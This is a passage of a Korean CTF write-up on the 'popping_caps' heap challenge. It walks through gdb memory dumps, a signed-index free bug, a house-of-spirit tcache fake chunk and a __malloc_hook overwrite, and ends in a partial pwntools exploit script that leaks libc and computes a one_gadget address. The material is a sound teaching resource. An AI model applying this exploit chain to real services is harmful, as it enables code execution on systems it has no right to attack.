operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b80c0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b80d0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b80e0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b80f0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8100</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8110</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8120</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8130</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span></code></pre></div>\n<ul>\n<li>0x3a8 만큼의 할당을 한후 해제를 하여 해당 tcache counter에 추가 된 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"fake-chunk를-만들기-위해-malloc0x3a8-하는-이유\" style=\"position:relative;\"><a href=\"#fake-chunk%EB%A5%BC-%EB%A7%8C%EB%93%A4%EA%B8%B0-%EC%9C%84%ED%95%B4-malloc0x3a8-%ED%95%98%EB%8A%94-%EC%9D%B4%EC%9C%A0\" aria-label=\"fake chunk를 만들기 위해 malloc0x3a8 하는 이유 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fake chunk를 만들기 위해 malloc(0x3a8) 하는 이유</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAACF0lEQVQozz3M3UtTcRzH8S86QroIKhQptiPu2DaZhgypi82H3INu5+y4h6N7wuVca4ssE7ecUCBZYNCTF15Myh5ACDT6Iwq67FoQE5eSeZGSy3mOv08Y5Bvety+yIk1vfwgTM1+9U8Wstdb26c2p+zFoVq5Cyo39nKJtc8WHwsKJWYC2l5fnv62u4vv6Oopra9goFrG9tYXfOzsol0pQymWQZHUTcPkshsKvMOFojRARgejjw6UFfNnrKUy9owo5QgSYl4AEgJtQlGEAGeztjf7a3JxQd3fHsb+fR6k0TnbLpbk2S8esvz2wKEvyfN9g/LXkib5vbLWsdAj+l91C35zb118wX0t+rnPZF89Vn5mura55evJ0TYGIrNNPnhGA48kp+NArh+AQgwhHYkhk0pAjCegMTeiVBxAeSMIfSaHHk4NHvAePfxJNLVfA8Q3gTc0PqLKKRsZyVQAqGVBJrk6HIvSIilvsV+W+lBqKptVkKKMK7RLzRxJqdDCl3L4VVwLh7KHbl1edQlZptnT90dbz4HjTXZ3eQBxv1BxubNDR5BF9zBcMMUmOsVgqw4ZuDLM7k2PMOxBg/fEMuz6SZaOPHjM5OcN80efMFXzBTC3dB9p6PTi+Mf8P1Bs19L82WydEsRe2Lg9sDglOIQibywut4SLa7V443AF0OGU0mFpwnqvDEaSrv3DA8Ubo9IY8xxuJ4w3H4F9g9AzkHHvAzgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/29d83927c90cc9acdbc8d783d2b62255/37523/4.png\"\n        srcset=\"/static/29d83927c90cc9acdbc8d783d2b62255/e9ff0/4.png 180w,\n/static/29d83927c90cc9acdbc8d783d2b62255/f21e7/4.png 360w,\n/static/29d83927c90cc9acdbc8d783d2b62255/37523/4.png 720w,\n/static/29d83927c90cc9acdbc8d783d2b62255/9a1cf/4.png 924w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>house of spirit 공격 기법에 관한 것이며 tcachebin에 삽입 될 fake chunk를 해제하고 다음 malloc을 바탕으로 원하는 곳을 할당할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ x<span class=\"token operator\">/</span><span class=\"token number\">100</span>gx <span class=\"token number\">0x5577632b8000</span>\n<span class=\"token number\">0x5577632b8000</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000251</span>\n<span class=\"token number\">0x5577632b8010</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8020</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8030</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8040</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000100</span>\n<span class=\"token number\">0x5577632b8050</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8060</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token number\">0x5577632b8210</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x00005577632b8260</span>\n<span class=\"token number\">0x5577632b8220</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8230</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8240</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8250</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x00000000000003b1</span>\n<span class=\"token number\">0x5577632b8260</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8270</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8280</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8290</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b82a0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b82b0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b82c0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b82d0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b82e0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b82f0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8300</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8310</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\ngdb<span class=\"token operator\">-</span>peda$ distance <span class=\"token number\">0x5577632b8050</span> <span class=\"token number\">0x5577632b8260</span> \nFrom <span class=\"token number\">0x5577632b8050</span> to <span class=\"token number\">0x5577632b8260</span><span class=\"token operator\">:</span> <span class=\"token number\">528</span> bytes<span class=\"token punctuation\">,</span> <span class=\"token number\">132</span> dwords\ngdb<span class=\"token operator\">-</span>peda$</code></pre></div>\n<ul>\n<li><code class=\"language-text\">0x3a8</code> 크기의 동적 할당을 한 후 해제하여 해당 tcache 힙 청크가 생긴 것을 확인할 수 있으며 우리는 <code class=\"language-text\">0x100</code> 을 size로 두어 fake chunk를 만들어야 하기 때문에 528 바이트 차이나는 부분 <code class=\"language-text\">0x5577632b8050</code> 메모리 에 참조하여 해제를 진행한다.</li>\n</ul>\n<h2 id=\"integer-issue\" style=\"position:relative;\"><a href=\"#integer-issue\" aria-label=\"integer issue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>integer issue</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v4 <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Whats in a free: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      ptr <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>v8<span class=\"token punctuation\">[</span><span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">==</span> buf <span class=\"token punctuation\">)</span>\n        buf <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n__int64 <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-30h]</span>\n  <span class=\"token keyword\">unsigned</span> __int64 v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-8h]</span>\n\n  v2 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">atol</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>read_num의 signed 처리를 진행하기 때문에 <code class=\"language-text\">v8</code> 주소 참조가 음수도 가능하여 다른 메모리 주소를 참조할 수 있다.</li>\n<li><code class=\"language-text\">-0x210</code> 범위에 주소 번지를 해제하여 fake chunk를 구성 한다.</li>\n<li>fake chunk 크기에 맞게 끔 malloc(0xf8) 할당한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ tcachebins\ntcachebins\n<span class=\"token number\">0x100</span> <span class=\"token punctuation\">[</span>  <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> <span class=\"token number\">0x55d0c72b0050</span> ◂— <span class=\"token number\">0x0</span>\n<span class=\"token number\">0x3b0</span> <span class=\"token punctuation\">[</span>  <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> <span class=\"token number\">0x55d0c72b0260</span> ◂— <span class=\"token number\">0x0</span></code></pre></div>\n<h2 id=\"writep64malloc_hook\" style=\"position:relative;\"><a href=\"#writep64malloc_hook\" aria-label=\"writep64malloc_hook permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>write(p64(malloc_hook))</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 60.55555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABcElEQVQoz4WS7VKCQBiFuw9nygoUCGlgwgRBwsBS2UW+dmHBXb6s+7+DRv2bOvP+feY558x7Vyaa76i7xEbFAjWeCYFg7ngjEvXl6GXCS8oDJ1y6OwDSACT+JgwiXNCedQfDsqVXFVc1LmmECCfI98/j/2GY5iDB/hqAOEMVI6yd2a6sTcumJ6zJyJ6XJhfhMM1hjL+2IUwQ3jdV083sD1nTy/ZQ1i2q2DU4iFGwy7x1sN2lOW337cFYuC+qXrAu39cpqW6b/Q2ECSasY/2v6Sxl9WRmt8wgRkGEvDUI4qygLW0P5slMWFfQ+thZvAzDJAcRclcbEKOCtbQ7xpZVndR9QZuspNfMx7VjtFxtYIIK1tH+xzzB57VvxA5TDKPM+w7CFJO6r/vf+blzc1wbV+xa7E/L/7D8ueM53tds7hi2KyoaLynvtju1HN1cPI2li/D8U9RmE+XVEEYLYWwJ4zdFmoqcNuTEwSM/GHJX3vMPlX6hskxBK+kAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/bd5b84a5c4222a1a2cac80b404091de2/37523/5.png\"\n        srcset=\"/static/bd5b84a5c4222a1a2cac80b404091de2/e9ff0/5.png 180w,\n/static/bd5b84a5c4222a1a2cac80b404091de2/f21e7/5.png 360w,\n/static/bd5b84a5c4222a1a2cac80b404091de2/37523/5.png 720w,\n/static/bd5b84a5c4222a1a2cac80b404091de2/d52e5/5.png 848w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>tcache_perthread_struct 의 head 영역의 0x20 크기 부분에 __malloc_hook 주소 가 삽입되 었기 떄문에 tcachebins를 확인한 결과 0x20으로 할당된 것을 확인할 수 있다.</li>\n<li>해당 상태에서 0x10 크기로 할당을 받게 된다면 __malloc_hook 영역에 할당하여 원하는 값으로 조작할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">from pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">malloc</span></span>\ndef <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">sla</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">sla</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"How many: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">free</span></span>\ndef <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">sla</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">sla</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Whats in a free: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token expression\">Write</span></span>\ndef <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">sla</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">sa</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Read me in: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token char\">'__main__'</span><span class=\"token operator\">:</span>        \n    context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token char\">'debug'</span>\n    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">context</span><span class=\"token expression\"><span class=\"token punctuation\">.</span>arch <span class=\"token operator\">=</span> </span><span class=\"token char\">'amd64'</span></span>\n\n    LOCAL <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    DEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n    s       <span class=\"token operator\">=</span> lambda data               <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>       \n    sa      <span class=\"token operator\">=</span> lambda delim<span class=\"token punctuation\">,</span>data         <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendafter</span><span class=\"token punctuation\">(</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    sl      <span class=\"token operator\">=</span> lambda data               <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendline</span><span class=\"token punctuation\">(</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    sla     <span class=\"token operator\">=</span> lambda delim<span class=\"token punctuation\">,</span>data         <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    r       <span class=\"token operator\">=</span> lambda num<span class=\"token operator\">=</span><span class=\"token number\">4096</span>           <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n    rn      <span class=\"token operator\">=</span> lambda                    <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">recvline</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ru      <span class=\"token operator\">=</span> lambda delims<span class=\"token punctuation\">,</span> drop<span class=\"token operator\">=</span>True  <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">recvuntil</span><span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span> drop<span class=\"token punctuation\">)</span>\n    irt     <span class=\"token operator\">=</span> lambda                    <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    uu32    <span class=\"token operator\">=</span> lambda data   <span class=\"token operator\">:</span><span class=\"token function\">u32</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span><span class=\"token function\">ljust</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    uu64    <span class=\"token operator\">=</span> lambda data   <span class=\"token operator\">:</span><span class=\"token function\">u64</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span><span class=\"token function\">ljust</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    leak    <span class=\"token operator\">=</span> lambda name<span class=\"token punctuation\">,</span> addr <span class=\"token operator\">:</span>log<span class=\"token punctuation\">.</span><span class=\"token function\">success</span><span class=\"token punctuation\">(</span><span class=\"token char\">'{} : {:#x}'</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> LOCAL<span class=\"token operator\">:</span>\n        <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">p</span> <span class=\"token expression\"><span class=\"token operator\">=</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span></span><span class=\"token char\">'./pwn'</span><span class=\"token expression\"><span class=\"token punctuation\">,</span>env<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><span class=\"token char\">'LD_PRELOAD'</span><span class=\"token expression\"><span class=\"token operator\">:</span></span><span class=\"token char\">'./libc-2.23.so'</span><span class=\"token expression\"><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></span></span>\n        p <span class=\"token operator\">=</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token char\">'./popping_caps'</span><span class=\"token punctuation\">)</span>\n        e <span class=\"token operator\">=</span> <span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span>'<span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>x86_64<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>gnu<span class=\"token operator\">/</span>libc<span class=\"token operator\">-</span><span class=\"token number\">2.27</span><span class=\"token punctuation\">.</span>so<span class=\"token number\">'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">e</span> <span class=\"token expression\"><span class=\"token operator\">=</span> <span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span></span><span class=\"token char\">'./popping_caps'</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span>\n        <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">libc</span> <span class=\"token expression\"><span class=\"token operator\">=</span> <span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span></span><span class=\"token char\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span>\n    <span class=\"token keyword\">else</span><span class=\"token operator\">:</span>\n        p <span class=\"token operator\">=</span> <span class=\"token function\">remote</span><span class=\"token punctuation\">(</span><span class=\"token char\">'172.25.87.200'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8000</span><span class=\"token punctuation\">)</span>\n        e <span class=\"token operator\">=</span> <span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span>'<span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>x86_64<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>gnu<span class=\"token operator\">/</span>libc<span class=\"token operator\">-</span><span class=\"token number\">2.27</span><span class=\"token punctuation\">.</span>so<span class=\"token number\">'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">libc</span> <span class=\"token expression\"><span class=\"token operator\">=</span> <span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span></span><span class=\"token char\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span>\n    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">lib</span> <span class=\"token expression\">leak</span></span>\n    <span class=\"token function\">ru</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Here is system \"</span><span class=\"token punctuation\">)</span>\n    lib_system <span class=\"token operator\">=</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token function\">rn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">strip</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> lib_system<span class=\"token operator\">-</span>e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token char\">'system'</span><span class=\"token punctuation\">]</span>\n    malloc_hook <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token char\">'__malloc_hook'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>libc\n    one_gadget <span class=\"token operator\">=</span> libc<span class=\"token 